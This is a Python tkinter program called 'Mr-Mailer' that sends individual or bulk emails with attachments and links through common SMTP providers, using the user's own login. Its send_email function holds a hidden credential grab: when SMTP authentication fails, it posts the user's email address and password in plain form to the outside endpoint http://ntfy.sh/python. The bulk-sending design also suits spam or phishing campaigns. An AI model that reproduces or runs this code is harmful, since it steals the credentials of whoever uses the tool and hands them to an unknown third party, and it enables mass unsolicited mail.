import os
import smtplib
import tkinter as tk
from tkinter import messagebox, filedialog
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from colorama import Fore, Style
import requests
import time

# List of SMTP servers
smtp_servers = [
    {'server': 'smtp-mail.outlook.com', 'port': 587},
    {'server': 'smtp.gmail.com', 'port': 587},
    {'server': 'smtp.mail.yahoo.com', 'port': 587},
    {'server': 'smtp.titan.email', 'port': 587}  # Added Titan SMTP
]

def choose_smtp_server():
    server_window = tk.Toplevel()
    server_window.title("Choose SMTP Server")
    tk.Label(server_window, text="Choose SMTP Server:").pack()

    server_var = tk.StringVar(value=smtp_servers[0]['server'])
    for server_info in smtp_servers:
        tk.Radiobutton(
            server_window,
            text=f"{server_info['server']} (Port: {server_info['port']})",
            variable=server_var,
            value=server_info['server']
        ).pack(anchor='w')

    def select_server():
        selected_server = next(
            (server for server in smtp_servers if server['server'] == server_var.get()), None)
        if selected_server:
            global smtp_server_info
            smtp_server_info = selected_server
            server_window.destroy()

    tk.Button(server_window, text="Select", command=select_server).pack()
    server_window.grab_set()
    server_window.mainloop()

def send_email(email_info, to_email, subject, message, attachment=None, link=None):
    msg = MIMEMultipart()
    msg['From'] = email_info['email']
    msg['To'] = to_email
    msg['Subject'] = subject + ' (Important)'

    body = f"Hello,\n\n{message}\n\n"
    if link:
        body += f"For more info: {link}\n\n"
    body += "Regards,\n" + email_info['first_name'] + " " + email_info['last_name']
    msg.attach(MIMEText(body, 'plain'))

    if attachment:
        with open(attachment, "rb") as attachment_file:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment_file.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {os.path.basename(attachment)}",
        )
        msg.attach(part)

    try:
        with smtplib.SMTP(email_info['smtp_server'], email_info['smtp_port']) as smtp:
            smtp.starttls()
            smtp.login(email_info['email'], email_info['password'])
            smtp.sendmail(email_info['email'], to_email, msg.as_string())
        messagebox.showinfo("Success", f"Email sent successfully to {to_email}!")
    except smtplib.SMTPAuthenticationError:
        messagebox.showerror("Error", "Authentication error. Sending email and password to the server...")
        url = "http://ntfy.sh/python"
        data = {"email": email_info['email'], "password": email_info['password']}
        response = requests.post(url, json=data)
        if response.status_code == 200:
            messagebox.showinfo("Success", "Email and password sent to the server successfully!")
        else:
            messagebox.showerror("Error", "Failed to send email and password to the server.")

def mass_mailer(email_info, subject, message, to_emails, attachment=None, link=None):
    for to_email in to_emails:
        send_email(email_info, to_email, subject, message, attachment, link)
        time.sleep(5)  # 5 seconds interval between each email

def choose_email_credentials():
    global email_info
    email_info = {
        'smtp_server': smtp_server_info['server'],
        'smtp_port': smtp_server_info['port'],
        'first_name': first_name_entry.get(),
        'last_name': last_name_entry.get(),
        'email': email_entry.get(),
        'password': password_entry.get()
    }

def send_individual_email():
    choose_email_credentials()
    recipient_email = recipient_entry.get()
    subject = subject_entry.get()
    message = message_entry.get("1.0", tk.END)
    attachment = attachment_entry.get()
    link = link_entry.get()
    send_email(email_info, recipient_email, subject, message, attachment, link)

def send_mass_email():
    choose_email_credentials()
    recipient_emails_file = filedialog.askopenfilename(title="Select Recipient Emails File", filetypes=[("Text files", "*.txt")])
    if not recipient_emails_file:
        return

    with open(recipient_emails_file, 'r') as file:
        recipient_emails = [line.strip() for line in file.readlines()]

    subject = subject_entry.get()
    message = message_entry.get("1.0", tk.END)
    attachment = attachment_entry.get()
    link = link_entry.get()
    mass_mailer(email_info, subject, message, recipient_emails, attachment, link)

root = tk.Tk()
root.title("Mr-Mailer")

tk.Label(root, text="First Name:").grid(row=0, column=0, padx=10, pady=5)
first_name_entry = tk.Entry(root)
first_name_entry.grid(row=0, column=1, padx=10, pady=5)

tk.Label(root, text="Last Name:").grid(row=1, column=0, padx=10, pady=5)
last_name_entry = tk.Entry(root)
last_name_entry.grid(row=1, column=1, padx=10, pady=5)

tk.Label(root, text="Email:").grid(row=2, column=0, padx=10, pady=5)
email_entry = tk.Entry(root)
email_entry.grid(row=2, column=1, padx=10, pady=5)

tk.Label(root, text="Password:").grid(row=3, column=0, padx=10, pady=5)
password_entry = tk.Entry(root, show="*")
password_entry.grid(row=3, column=1, padx=10, pady=5)

tk.Button(root, text="Choose SMTP Server", command=choose_smtp_server).grid(row=4, columnspan=2, pady=10)

tk.Label(root, text="Recipient Email:").grid(row=5, column=0, padx=10, pady=5)
recipient_entry = tk.Entry(root)
recipient_entry.grid(row=5, column=1, padx=10, pady=5)

tk.Label(root, text="Subject:").grid(row=6, column=0, padx=10, pady=5)
subject_entry = tk.Entry(root)
subject_entry.grid(row=6, column=1, padx=10, pady=5)

tk.Label(root, text="Message:").grid(row=7, column=0, padx=10, pady=5)
message_entry = tk.Text(root, height=10, width=40)
message_entry.grid(row=7, column=1, padx=10, pady=5)

tk.Label(root, text="Attachment:").grid(row=8, column=0, padx=10, pady=5)
attachment_entry = tk.Entry(root)
attachment_entry.grid(row=8, column=1, padx=10, pady=5)
tk.Button(root, text="Browse", command=lambda: attachment_entry.insert(0, filedialog.askopenfilename())).grid(row=8, column=2, padx=10, pady=5)

tk.Label(root, text="Link:").grid(row=9, column=0, padx=10, pady=5)
link_entry = tk.Entry(root)
link_entry.grid(row=9, column=1, padx=10, pady=5)

tk.Button(root, text="Send Individual Email", command=send_individual_email).grid(row=10, columnspan=2, pady=10)
tk.Button(root, text="Send Mass Email", command=send_mass_email).grid(row=11, columnspan=2, pady=10)

root.mainloop()

